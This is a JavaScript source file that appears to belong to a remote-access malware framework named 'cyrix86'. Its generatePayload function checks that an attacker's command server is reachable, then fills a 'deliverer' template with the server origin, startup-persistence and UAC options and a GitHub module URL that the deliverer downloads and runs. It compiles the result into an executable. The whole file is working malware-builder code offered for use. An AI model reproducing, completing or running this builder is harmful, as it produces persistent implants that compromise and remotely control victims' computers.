const { randomString, addOnCode } = require("../utils/payload-helpers")
const { constants } = require("../utils/server-helpers")
const { execSync } = require("child_process")
const { default: axios } = require("axios")
const payloads = require("./payloads")
const path = require("path")
const fs = require("fs")


const INSTALLMODULENAME = `https://github.com/madhanmaaz/cyrix86-module/archive/refs/heads/master.zip`
const RUNMODULENAME = `cyrix86`

async function generatePayload(body) {
    if (body.origin.endsWith("/")) {
        body.origin = body.origin.slice(0, body.origin.length - 1)
    }

    // other exceptions
    body.filename = body.filename.replaceAll(".exe", "")
    body.filename = body.filename.replaceAll(".", "_")
    body.filename = body.filename.replaceAll(" ", "_")
    body.filename = body.filename.replaceAll("-", "_")
    body.origin = body.origin.replaceAll(" ", "")

    // checking origin if it is online
    try {
        if ((await axios.get(`${body.origin}/cyrix86`)).data != "cyrix-OK") {
            sendLog(1, "Cyrix86 origin get failed. Enter valid cyrix86 origin url")
            return
        }

        if (body.origin.includes("localhost") || body.origin.includes("127.0.0.1")) {
            sendLog(0, "Warning this is local origin")
        }
        sendLog(0, "Cyrix86 origin get success")
    } catch (error) {
        sendLog(1, "Cyrix86 origin get failed. Enter valid cyrix86 origin url")
        return
    }

    sendLog(0, `Creating ${body.payload} payload.`)

    // generating deliverer
    const payloadConfig = payloads[body.payload]
    const payloadFilePath = path.join(__dirname, payloadConfig.folder, `${payloadConfig.file}.${payloadConfig.ext}`)
    const sourceFilePath = path.join(constants.SOURCEFOLDER, `${body.filename}.${payloadConfig.ext}`)
    const buildFilePath = path.join(constants.BUILDFOLDER, `${body.filename}.${payloadConfig.oext}`)

    let payloadCode = fs.readFileSync(payloadFilePath, "utf-8")
    payloadCode = payloadCode.replaceAll("ADDON", addOnCode(body))
    payloadCode = payloadCode.replaceAll("RANDOMFOLDER", randomString(10))
    payloadCode = payloadCode.replaceAll("ARGS", btoa(`${body.origin},${body.startup},${body.uac}`))
    payloadCode = payloadCode.replaceAll("INSTALLMODULENAME", INSTALLMODULENAME)
    payloadCode = payloadCode.replaceAll("RUNMODULENAME", RUNMODULENAME)

    fs.writeFileSync(sourceFilePath, payloadCode, "utf-8")
    sendLog(0, `Source filepath: ${sourceFilePath}`)

    if (!payloadConfig.build) return

    // checking compiler is present
    let compiler = payloadConfig.lcompiler
    try {
        let programUtil = "which"
        if (process.platform == "win32") {
            programUtil = "where"
            compiler = payloadConfig.wcompiler
        }

        let output = execSync(`${programUtil} ${compiler}`, { encoding: "utf-8" })
        sendLog(0, `${output}           SUCCESS -> ${compiler} found.`)
    } catch (error) {
        sendLog(1, `${error.message} | ${compiler} not found. Installing ${compiler}`)
        return
    }

    // compile process
    try {
        let cmd = payloadConfig.lcmd
        if (process.platform == "win32") {
            cmd = payloadConfig.wcmd
        }

        cmd = cmd.replace("[COMPILER]", compiler)
        cmd = cmd.replace("[INPUTFILENAME]", sourceFilePath)
        cmd = cmd.replace("[OUTPUTFILENAME]", buildFilePath)

        sendLog(0, execSync(cmd, { encoding: "utf-8" }))
        sendLog(0, `Build filepath: ${buildFilePath}`)
    } catch (error) {
        sendLog(1, error.message)
    }
}

function sendLog(type, data) {
    IO.emit("build-logs", type, data)
}

module.exports = {
    generatePayload
}